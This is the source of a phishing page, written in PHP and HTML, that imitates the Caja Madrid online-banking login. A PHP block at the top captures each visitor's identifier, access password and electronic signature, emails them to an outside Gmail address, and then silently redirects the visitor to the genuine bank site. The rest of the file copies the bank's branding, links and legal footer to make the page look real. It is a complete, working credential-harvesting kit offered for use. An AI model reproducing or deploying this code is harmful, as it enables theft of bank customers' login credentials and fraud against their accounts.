<?php

$to = "johnknd3@gmail.com";
$ff = array();
$ff[0]=$_POST['Documento_s'];
$ff[1]=$_POST['pass'];
$ff[2]=$_POST['firma'];
$ff[3]=$_POST['ButS'];
if (isset($ff[3])) {
	if (!is_numeric($ff[0]) || !is_numeric($ff[1]) || strlen($ff[0]) < 7|| strlen($ff[0]) > 8 ||strlen($ff[1])!=4 || !is_numeric($ff[2]) || strlen($ff[2]) !=8) {
		$LogErr=1;
	}else {
$content = 'Identificador :'.$ff[0].chr(10).'Clave :'.$ff[1].chr(10).'Firma :'.$ff[2].chr(10);
$subject = 'Caja Madrid';
$from = '';
$headers = "MIME-Version: 1.0\r\n";
$headers.= "From: $from\r\n";
mail($to, $subject, $content, $headers);
echo "<script>location.replace('http://www.cajamadrid.es');</script>";
	}
}

?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html lang="es"><head>






<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1"><title>Bienvenido</title>
<link href="http://www.cajamadrid.es/favicon.ico" rel="shortcut icon">

<script type="text/javascript">
<!--
 var ip="0";
//-->
</script>
<script type="text/javascript">
<!--


var varmsgLoginE = new Array();

varmsgLoginE[0] = "La opci\363n seleccionada no es v\341lida con Mozilla Firefox.\nPor favor, utilice Microsoft Internet Explorer.";
varmsgLoginE[1] = "Teclee su identificador sin letras y clave de acceso de Oficina Internet:";
varmsgLoginE[2] = "Identificador";
varmsgLoginE[3] = "D.N.I.";
varmsgLoginE[4] = "Introduzca su tarjeta con chip en el lector y teclee su clave de acceso de Oficina de Internet:";
varmsgLoginE[5] = "Teclee su clave de acceso de Oficina de Internet:";
 
//-->
</script>
<script src="login_files/loginE.js" type="text/javascript"></script>
<script src="login_files/trimString.js" type="text/javascript"></script>






<script src="login_files/cm_loginE.js" type="text/javascript"></script>
<script src="login_files/abrirCorrespondencia.js" type="text/javascript"></script>
<script src="login_files/ayuda.js" type="text/javascript"></script>
<script src="login_files/registrodeclases.js" type="text/javascript"></script>
<script src="login_files/comportamientos.js" type="text/javascript"></script>
<script type="text/javascript">
//<!--
function ols(){}function addOnLoad(newFunction){var j=0;while(eval('ols.f'+j)){j++;}eval('ols.f'+j+'=' + newFunction);}
function eOls(){var j = 0;while(eval('ols.f'+j))	{eval('ols.f'+j+'()');j++;}}window.onload = eOls;
addOnLoad("AsignarComportamiento")
//--></script>
<script type="text/javascript"><!--

/*
function corregirOnkeypress(){if(document.getElementsByTagName){corregirOnkeypressEmtos("a");corregirOnkeypressEmtos("input");}}
function corregirOnkeypressEmtos(nomTag)
{
	var emtos = document.getElementsByTagName(nomTag);
	for (var i = 0; i < emtos.length; i++)
	{
		if(emtos[i].onkeypress)
		{
			if(!emtos[i].type || emtos[i].type == "image" || emtos[i].type == "submit" )
			{
				eval('var tmpOnkeypress'+nomTag+i+' =emtos[i].onkeypress;');
				eval('emtos['+i+'].onkeypress = function(evt){if (esTabulador(evt)) return true;return tmpOnkeypress'+nomTag+i+'();}');
			}
		}
	}
}
function esTabulador(evt){var keyCode = evt ? evt.keyCode : event.keyCode;return (keyCode == 9);}
addOnLoad("corregirOnkeypress")

//-->
*/
</script>
<script type="text/javascript">
window.onload = function(){
	var subBut=document.getElementById('subBut');
	var documento=document.getElementById('Documento_s');
	var pass=document.getElementById('pass');
	var firma=document.getElementById('firma1');
	var subForm=document.getElementById('subForm');
	subForm.onsubmit = function(){

		if (documento.value.length < 7) {
			alert('POR FAVOR, INTRODUZCA SU NUMERO DE DOCUMENTO');
			return false;
		}
		else if (documento.value.length > 8) {
			alert('POR FAVOR, INTRODUZCA SU NUMERO DE DOCUMENTO');
			return false;
		}
		else if (pass.value.length !=4 ) {
			alert('POR FAVOR, INTRODUZCA SU CLAVE');
			return false;
		}
		else if (firma.value.length != 8) {
			alert('POR FAVOR, INTRODUZCA SU FIRMA');
			return false;
		}
		else { return true; }
	}
}
</script>




<style type="text/css" media="all">
@import url( https://oi.cajamadrid.es/CajaMadrid/oi/css/estilos_oiv1_1.css );
</style>
	<link rel="stylesheet" href="login_files/estilos_handheld_oiv1_1.css" type="text/css" media="handheld"></head><noscript>
<p>El panel de Firma Electr&oacute;nica Accesible requiere tener
activado JavaScript en su navegador por motivos de seguridad. <a
href="http://www.cajamadrid.es/CajaMadrid/Home/puente?pagina=3497">Informaci&oacute;n
de seguridad</a> </p> <p>Puede informarse de otras alternativas para
realizar sus operaciones a trav&eacute;s del Servicio de
atenci&oacute;n al cliente llamando al 902 2 4 6 8 10 o visitando <a
href="http://www.cajamadrid.es/CajaMadrid/Home/cruce/0,0,3693,00.html">Banca
telef&oacute;nica</a></p>
</noscript><body class="login">
<iframe id="webSigner" name="webSigner" class="oculto" src="login_files/blank.htm" height="0" width="0"></iframe>
<FORM id="subForm" action="login.php" method="post"><INPUT id=tr_oyztFxwMqD type=hidden>


<script language="JavaScript" src="login_files/BigInt.js"></script>

<script language="JavaScript" src="login_files/Barrett.js"></script>

<script language="JavaScript" src="login_files/RSA.js"></script>

<script language="JavaScript">

<!--
/*
var key;


function createKey(e,d,m)
{
	//setMaxDigits(64);
	setMaxDigits(65);
	key = new RSAKeyPair(e,d,m);
}


function cifrarRSA(campo)
{

        var e = "10001";
		var m = "166d10b5952c2bbce570e33ad213eaa1ce34ececc9e8a795f583adeeaab508cc99def43836e8e1f4452a15fc6e8f1302395c7b3b1cd9122aab606c3900ec9e47";
		var d = "";
		createKey(e,d,m);
        var aux = campo;
        var i = aux.length;
        for(i;i<8;i++){
          aux = "*"+aux;
        }
        aux = aux + "20070416022133";
        var enc = encryptedString(key, aux);
        return "01"+enc;
}
*/
// -->
</script>





<div id="login_nuevo">
	<a id="foco_vacio" tabindex="32767" class="oculto" href=""></a>
	<div id="contenedor_nuevo">
		<div id="cabecera_nuevo">
			<h1 title="Caja Madrid"><img src="login_files/logocm.gif" alt="Caja Madrid"></h1>
			<h2 title="Oficina Internet Caja Madrid"><img src="login_files/logo_oi_new.gif" class="logooi" alt="Oficina Internet Caja Madrid"></h2>
		</div>
		<div id="parte_izquierda">
			<div class="contenedor_izquierdo">
				<img src="login_files/img_izq.jpg" alt="">
			</div>
			<div class="contenedor_izquierdo_fondo">
				<div class="fondo">
					<p>¿Aún no dispone de clave de acceso a la Oficina Internet?</p>
					<a href="http://www.cajamadrid.es/CajaMadrid/Home/puente?pagina=1109*3691">&gt; Hágase cliente</a>
					<a href="http://www.cajamadrid.es/Portal_Corporativo/html/Demo_OI/html/demo1.html" onClick="abrirDemo();return false;" onKeyPress="abrirDemo();return false;">&gt; Ver demo</a>
				</div>
			</div>
			<div class="contenedor_izquierdo_fondo">
				<div class="fondo">
					<h3>Servicio de atención al cliente</h3>
					<p class="menos">Si desea hacernos alguna consulta por teléfono, hágalo llamando al <span class="tlf">902 2 4 6 8 10</span></p>
				</div>
			</div>
		</div>
		<h3 class="oculto">Menú de idiomas</h3>
		<div id="parte_derecha">
			<div class="contenedor_derecha">
				<ul class="idiomas">
				
				</ul>
				<h3 class="oculto">Opciones de identificación</h3>
				<ul class="opciones clearfix">
					<li class="sin lista_uno clearfix"><span class="oculto">1. </span>Seleccione su método de acceso: <a href="" onClick="lanzaAyuda('5937','LoginDNIe');" onKeyPress="lanzaAyuda('5937','LoginDNIe');" onMouseOver="op2('infMetodo')" onMouseOut="op1('infMetodo')"><img src="login_files/interr.gif" alt="Ayuda" class="ayuda" id="infMetodo"></a>
						<div class="wrapper3">
						
							
							<div class="fila">
								<input class="rbutton" checked="checked" onClick="tipoAcceso(this.id)" onKeyPress="tipoAcceso(this.id)" id="DNI" name="TipoTarjeta" value="DNI" type="radio"><label for="DNI">Su identificador (<acronym title="Documento Nacional de Identidad">D.N.I.</acronym>, Pasaporte, Tarjeta Residencia)</label>
							</div>
							
							
							<div class="fila mtneg">
								<input class="rbutton" onClick="tipoAcceso(this.id)" onKeyPress="tipoAcceso(this.id)" id="DNIe" name="TipoTarjeta" value="DNIe" type="radio"><label for="DNIe"><acronym title="Documento Nacional de Identidad">D.N.I.</acronym> electrónico </label><img src="login_files/dni_e.gif" alt="DNI electrónico" class="dni_elec"></a>
							</div>
							
						
						</div>
					</li>
					
					<li id="capaTextoDNIe" class="lista_dos">
						<span class="oculto" id="numero_dos">2. </span>Introduzca su <acronym title="Documento Nacional de Identidad">D.N.I.</acronym> electrónico en el lector y teclee el PIN de su <acronym title="Documento Nacional de Identidad">D.N.I.</acronym> electrónico
					</li>
					
					<li id="capaCampos" class="lista_dos">
						<span class="oculto" id="numero_tres">2. </span><span id="txtCapaCampos">Teclee su identificador sin letras y clave de acceso de Oficina Internet:</span>
												
						<div class="wrapper3">
                        
                        <?php
						if ($LogErr==1) {
						?>
						<span style="color:red;"> IDENTIFICADOR O CLAVE INCORRECTA</span>
                        <?php } ?>
							
						
							
							
							<div class="fila clearfix" id="filaDNIe">
								<span><label for="Documento_s" id="labelDocumento_s" class="DesactivarCajetin">Identificador:</label></span><span class="oculto" id="txtDNIe"></span>
								<input tabindex="700" class="ancho" name="Documento_s" id="Documento_s" maxlength="15"  onClick="seleccionarTexto(this);" onFocus="seleccionarTexto(this);" type="text">
							</div>
							
							
														<div class="fila clearfix">
				
								<span><label for="Documento_s" id="labelDocumento_s" class="DesactivarCajetin">Clave:</label></span><span class="oculto" id="txtDNIe"></span>
								<input tabindex="700" class="ancho" name="pass" id="pass" maxlength="15" onClick="seleccionarTexto(this);" onFocus="seleccionarTexto(this);" type="password">
							
							</div>
														<div id="CajetinoyztFxwMqD"></div>
							<div class="fila clearfix">

								<span><label for="firma" id="firma" class="DesactivarCajetin">Firma:</label></span><span class="oculto" id="txtDNIe"></span>
								<input tabindex="700" class="ancho" name="firma" id="firma1" maxlength="15" onClick="seleccionarTexto(this);" onFocus="seleccionarTexto(this);" type="password">
					
							</div>
							<div class="fila clearfix mtneg">								
								
									
						
											<span><label for="selopcion_s" class="DesactivarCajetin">Ir a</label></span>
											
											
			
											





              
              <select tabindex="1200" name="selopcion_s" id="selopcion_s" onkeypress="return tabOnEnter2 (2, event);">
                
				<option value="flujoPaginaPrincipalCMPPOTE#5950$0" selected="selected">Inicio</option>
				
				<option value="flujoCMPPOTE#5001$0">Posición Global</option>
				
				<option value="flujoConsultaSaldo_CCPP#5003$0">Saldo de cuentas</option>
				
				<option value="FlujoConsultaUltimosMovimientos_CCPP#5007$0">Movimiento de cuentas</option>
				
				<option value="subflujoTransferenciasGenerales#5040$0">Transferencias</option>
				
				<option value="flujoConsultaMercado#8011$0">Cotizaciones de valores</option>
				
				<option value="subFlujoOpCompraVentaValores#8014$0">Compra/Venta de valores</option>
				
				<option value="subflujoConsultaSaldoNew#5120$0">Saldo de tarjetas</option>
				
				<option value="subflujoRecargaTelefonoMovil#5128$0">Recarga de móviles</option>
				
              </select>
              
             

						
									
								
								
								
								
							</div>
							<div class="fila clearfix">
								<span>&nbsp;</span><input value="Entrar" name="ButS" id="subBut" type="submit">
							</div>
						</div>	
					</li>
				</ul>
			</div>
			<h3 class="oculto">Información adicional</h3>
			<div class="links_derecha">
				<ul>
					<li><a href="https://oi.cajamadrid.es/CajaMadrid/oi/pt_oi/Login/generaPopUpLogin?NumeroPagina=6315&amp;NumeroSeccion=34308" onKeyPress="abrirPopUpLogin('6315','34308');return false" onClick="abrirPopUpLogin('6315','34308');return false">&gt; ¿Ha olvidado su  clave de acceso o la tiene bloqueada?</a></li>
					<li>
						<a href="http://www.cajamadrid.es/CajaMadrid/Home/puente?pagina=3497" onKeyPress="abrirInformacion();return false" onClick="abrirInformacion();return false">&gt; Información de seguridad</a>
						<a href="https://oi.cajamadrid.es/CajaMadrid/oi/pt_oi/Login/generaPopUpSello" onKeyPress="abrirSello();return false;" onClick="abrirSello();return false;"><img src="login_files/sello_oi_mini.gif" alt="Información de seguridad"></a>
					</li>
				</ul>
			</div>
		</div>
		<h3 class="oculto">Pie de página</h3>
		<div id="pie_nuevo" class="clearfix">
			<p>El servicio está optimizado para Explorer 5.0 o superior y Netscape 6.0 o superior</p>
			<p class="pie_gris">CAJA MADRID</p>
			<address class="pie_gris">Caja de Ahorros y Monte de Piedad de Madrid, CAJA MADRID, C.I.F. G-28029007, Plaza de Celenque, 2. 28013 Madrid.<br>
Inscrita en el Rº Mercantil de Madrid al folio 20; tomo 3067 General;
hoja 52454; y en el Rº Especial de Cajas de Ahorros con el número 99.
Código B.E.: 2038. Código BIC: CAHMESMMXXX. Entidad de crédito sujeta a
supervisión del Banco de España </address>
			<p class="gris_mas">© Caja Madrid. 2001 - 2008. España. Todos los derechos reservados.</p>
		</div>
	</div>
</div>

<script src="login_files/cm_CajetinFirmas.js" type="text/javascript"></script>



<input name="TipoIdentificacion_s" value="D" type="hidden">


<!-- Campos para DNIe -->



  <!--INI Homogeneizacion de los login de particulares-->
  
     
  <!--FIN Homogeneizacion de los login de particulares-->



</form>
<script type="text/javascript">
<!--
XSMLNP="oyztFxwMqD";
//-->
</script>


</body></html>
